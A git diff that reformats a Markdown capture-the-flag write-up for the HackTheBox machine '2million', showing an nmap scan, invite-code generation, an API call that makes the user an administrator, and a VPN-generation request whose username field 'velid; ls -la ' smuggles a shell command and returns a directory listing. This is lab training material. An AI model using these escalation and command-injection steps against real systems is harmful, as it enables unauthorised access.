@@ -7,7 +7,7 @@ year: "2024"
 
 ![](attachment/d8433fa495034cedbcbde285f3a79d68.png)
 ```
- " # Nmap 7.94SVN scan initiated Sat Aug 10 10:26:58 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan 10.10.11.221
+ # Nmap 7.94SVN scan initiated Sat Aug 10 10:26:58 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan 10.10.11.221
 Nmap scan report for 2million.htb (10.10.11.221)
 Host is up (0.061s latency).
 Not shown: 65533 closed tcp ports (conn-refused)
@@ -27,66 +27,40 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
 
 ![](attachment/cebd9713f29652a2953bbac2f2371ed1.png)
-**Invite code generation
+### Invite code generation
 
 ``` shell
-
 ┌──(kali㉿kali)-[~/HTB]
-
 └─$ curl -X POST \
-
   http://2million.htb/api/v1/invite/generate \
-
   -H 'Content-Type: application/json' \
-
   -d '{}'
-
 {"0":200,"success":1,"data":{"code":"N0VDWEYtQjFWU1UtVDNZSTktMTFMRFc=","format":"encoded"}}                                                                                                                                    
-
 ┌──(kali㉿kali)-[~/HTB]
-
 └─$
-
 ┌──(kali㉿kali)-[~/HTB]
-
 └─$ curl -X POST \
-
   http://2million.htb/api/v1/invite/generate \
-
   -H 'Content-Type: application/json' \
-
   -d '{}'
-
 {"0":200,"success":1,"data":{"code":"SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=","format":"encoded"}}                                                                                                                              
-
 ┌──(kali㉿kali)-[~/HTB]
-
 └─$ echo "SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=" | base64 -d          
-
 HYJ9E-H3PSB-0HILZ-09HUU      
 
 ```
 
-**APIs
+### APIs
 ```
 HTTP/1.1 200 OK
-
 Server: nginx
-
 Date: Sun, 11 Aug 2024 12:01:01 GMT
-
 Content-Type: application/json
-
 Connection: keep-alive
-
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
-
 Cache-Control: no-store, no-cache, must-revalidate
-
 Pragma: no-cache
-
 Content-Length: 800
-
 
 {
   "v1": {
@@ -127,7 +101,6 @@ Content-Length: 800
 
 Make a PUT request to /api/v1/admin/settings/update with
 ```
-
 {
 	"email": <youremail>,
 	"is_admin": 1
@@ -138,60 +111,32 @@ Make a PUT request to /api/v1/admin/settings/update with
 
 ```
 POST /api/v1/admin/vpn/generate HTTP/1.1
-
 Host: 2million.htb
-
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-
 Accept-Language: en-US,en;q=0.5
-
 Content-Type: application/json
-
 Accept-Encoding: gzip, deflate, br
-
 Referer: http://2million.htb/home
-
 Connection: keep-alive
-
 Cookie: PHPSESSID=bgo6jig411fj3nk8bciqfonpdo
-
 Upgrade-Insecure-Requests: 1
-
 Content-Length: 47
 
-
-
-
-
 {
-
 "username": "velid; ls -la "
-
 }
 
 -----------------------------------------------------------------
-
 HTTP/1.1 200 OK
-
 Server: nginx
-
 Date: Sun, 11 Aug 2024 18:21:16 GMT
-
 Content-Type: text/html; charset=UTF-8
-
 Connection: keep-alive
-
 Expires: Thu, 19 Nov 1981 08:52:00 GMT
-
 Cache-Control: no-store, no-cache, must-revalidate
-
 Pragma: no-cache
-
 Content-Length: 690
-
-
 
 total 56
 drwxr-xr-x 10 root root 4096 Aug 11 18:20 .
